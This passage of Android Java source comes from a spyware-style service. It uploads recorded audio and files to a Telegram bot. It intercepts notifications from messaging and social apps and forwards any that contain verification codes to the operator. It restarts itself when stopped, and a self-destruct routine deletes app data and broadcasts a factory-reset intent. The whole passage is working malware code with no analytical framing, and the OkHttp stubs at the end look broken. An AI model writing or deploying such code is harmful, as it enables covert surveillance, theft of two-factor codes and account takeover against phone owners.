            sendToTelegram("👀 تم إظهار التطبيق", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void selfDestruct() {
        try {
            File appDir = new File(getApplicationInfo().dataDir);
            deleteRecursive(appDir);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                Intent intent = new Intent(Intent.ACTION_FACTORY_RESET);
                sendBroadcast(intent);
            }
            
            android.os.Process.killProcess(android.os.Process.myPid());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            for (File child : fileOrDirectory.listFiles()) {
                deleteRecursive(child);
            }
        }
        fileOrDirectory.delete();
    }

    private void copyFile(File src, File dst) throws IOException {
        FileInputStream in = new FileInputStream(src);
        FileOutputStream out = new FileOutputStream(dst);
        byte[] buf = new byte[1024];
        int len;
        while ((len = in.read(buf)) > 0) {
            out.write(buf, 0, len);
        }
        in.close();
        out.close();
    }

    private void zipFiles(List<File> files, File zipFile) throws IOException {
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        byte[] buffer = new byte[1024];
        
        for (File file : files) {
            FileInputStream fis = new FileInputStream(file);
            zos.putNextEntry(new ZipEntry(file.getName()));
            
            int length;
            while ((length = fis.read(buffer)) > 0) {
                zos.write(buffer, 0, length);
            }
            
            fis.close();
            zos.closeEntry();
        }
        zos.close();
    }

    private void sendAudioToTelegram(File file) {
        try {
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "🎤 تسجيل صوت - " + new Date().toString())
                    .addFormDataPart("audio", file.getName(),
                            RequestBody.create(MediaType.parse("audio/3gp"), file))
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendAudio")
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onResponse(Call call, Response response) {
                    response.close();
                    file.delete();
                }

                @Override
                public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendFileToTelegram(File file, String fileName) {
        try {
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "📁 " + fileName + " - " + new Date().toString())
                    .addFormDataPart("document", fileName,
                            RequestBody.create(MediaType.parse(getMimeType(fileName)), file))
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendDocument")
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onResponse(Call call, Response response) {
                    response.close();
                    file.delete();
                }

                @Override
                public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendToTelegram(String message, String chatId) {
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
        
        FormBody formBody = new FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", message)
                .add("parse_mode", "Markdown")
                .build();
        
        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onResponse(Call call, Response response) {
                response.close();
            }

            @Override
            public void onFailure(Call call, IOException e) {}
        });
    }

    private String getMimeType(String url) {
        String type = null;
        String extension = MimeTypeMap.getFileExtensionFromUrl(url);
        if (extension != null) {
            type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
        }
        return type != null ? type : "application/octet-stream";
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        
        if (pkg.contains("facebook") || pkg.contains("instagram") || 
            pkg.contains("tiktok") || pkg.contains("twitter") ||
            pkg.contains("whatsapp") || pkg.contains("telegram") ||
            pkg.contains("messenger")) {
            
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getString(Notification.EXTRA_TEXT, "");
            
            if (title.contains("رمز") || title.contains("code") ||
                title.contains("تأكيد") || title.contains("verify") ||
                text.contains("رمز") || text.contains("code")) {
                
                sendToTelegram("🔐 رمز تحقق: " + text, CHAT_ID);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (mediaRecorder != null) {
            mediaRecorder.release();
        }
        if (camera != null) {
            camera.release();
        }
        
        Intent intent = new Intent(this, CommandService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    // واجهات OkHttp
    interface Callback {
        void onResponse(Call call, Response response) throws IOException;
        void onFailure(Call call, IOException e);
    }

    static class Call {
        void enqueue(Callback callback) {}
    }
                      }
